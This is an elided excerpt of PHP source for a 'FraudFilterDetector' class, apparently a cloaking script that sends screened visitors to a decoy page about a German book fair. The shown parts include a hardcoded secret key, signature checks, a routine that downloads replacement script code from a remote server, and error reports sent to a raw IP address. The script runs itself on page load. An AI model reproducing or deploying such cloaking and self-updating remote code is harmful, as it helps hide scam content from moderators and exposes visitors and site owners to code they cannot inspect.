...
class FraudFilterDetector_22ddj {
    ...
    function isSignatureValid($sign, $time) {
        $str = '44dffea2-7634-4d9e-8dad-ed2ec20414a7.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.deutschland.de/en/topic/culture/2020-book-fair-the-german-book-prize-and-facts-about-the-book-trade');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 44dffea2-7634-4d9e-8dad-ed2ec20414a7',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 44dffea2-7634-4d9e-8dad-ed2ec20414a7';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 44dffea2-7634-4d9e-8dad-ed2ec20414a7';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=22ddj&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_22ddj = new FraudFilterDetector_22ddj();
$fraudFilterDetector_22ddj->check();
